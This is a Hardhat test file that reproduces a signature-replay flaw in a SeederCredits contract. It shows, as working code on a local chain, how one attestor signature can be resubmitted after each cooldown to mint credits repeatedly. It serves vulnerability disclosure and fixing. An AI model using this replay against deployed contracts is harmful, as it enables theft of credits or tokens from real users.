/**
 * W3B-001 / SEC-012 REPRO — SeederCredits.submitSeedingReport signature replay.
 *
 * The attestor-signed message is keccak256(seeder, arweaveTxId, claimedAmount, chainId):
 * NO nonce, NO timestamp, NO expiry. The only replay throttle is the 1-day
 * per-seeder cooldown. A seeder who earns ONE legitimate attestor signature can
 * replay the identical (txid, amount, signature) tuple every cooldown window,
 * minting fresh credits each time without doing any further seeding.
 *
 * Expected (buggy) behavior: the second submitSeedingReport with the SAME
 * signature succeeds after the cooldown, doubling credits from one signature.
 * Fixed behavior would be: second submission reverts (replay protection).
 *
 * Run: cd packages/contracts && npx hardhat test ../../devteam/repro/w3b-signature-replay.test.ts
 * (repo is read-only in review; this file lives under devteam/repro/ only)
 */

const TXID = "ar://seeding-report-001";
const DAY = 24 * 60 * 60;

// loadFixture is provided by the hardhat toolbox (imported explicitly here
// because this repro lives outside test/ and has no shared setup file).
const { loadFixture } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");

async function deployFixture() {
  const [owner, seeder] = await ethers.getSigners();
  const movieTicket = await ethers.deployContract("MovieTicket", [2500n], owner);
  const seederCredits = await ethers.deployContract(
    "SeederCredits",
    [await movieTicket.getAddress()],
    owner
  );
  const chainId = (await ethers.provider.getNetwork()).chainId;
  return { seederCredits, owner, seeder, chainId };
}

async function signClaim(attestor: any, seederAddr: string, txid: string, amount: bigint, chainId: bigint) {
  const messageHash = ethers.solidityPackedKeccak256(
    ["address", "string", "uint256", "uint256"],
    [seederAddr, txid, amount, chainId]
  );
  return attestor.signMessage(ethers.getBytes(messageHash));
}

describe("W3B-001 repro: attestor signature replay across cooldowns", () => {
  it("REPLAYS one attestor signature after the cooldown -> credits minted twice", async () => {
    const { seederCredits, owner, seeder, chainId } = await loadFixture(deployFixture as any);
    const amount = 1000n;

    // ONE legitimate attestor signature for this seeder/claim.
    const sig = await signClaim(owner, seeder.address, TXID, amount, chainId);

    // First claim: succeeds, credits == amount.
    await seederCredits.connect(seeder).submitSeedingReport(TXID, amount, sig);
    expect(await seederCredits.credits(seeder.address)).to.equal(amount);

    // Immediate replay is blocked by the cooldown (expected).
    let reverted = false;
    try {
      await seederCredits.connect(seeder).submitSeedingReport(TXID, amount, sig);
    } catch (e: any) {
      reverted = /Claim cooldown active/.test(String(e && e.message));
    }
    expect(reverted, "immediate replay should revert with 'Claim cooldown active'").to.equal(true);

    // Advance past the 1-day cooldown and replay the IDENTICAL signature.
    await ethers.provider.send("evm_increaseTime", [DAY + 1]);
    await ethers.provider.send("evm_mine", []);

    // BUG: the same signature is accepted again -> credits double from one signature.
    await seederCredits.connect(seeder).submitSeedingReport(TXID, amount, sig);
    const credits = await seederCredits.credits(seeder.address);

    console.log(`      credits after replaying ONE signature twice: ${credits} (claimed amount: ${amount})`);
    // This assertion documents the vulnerable behavior: 2x credits from 1 signature.
    expect(credits).to.equal(amount * 2n);
  });
});
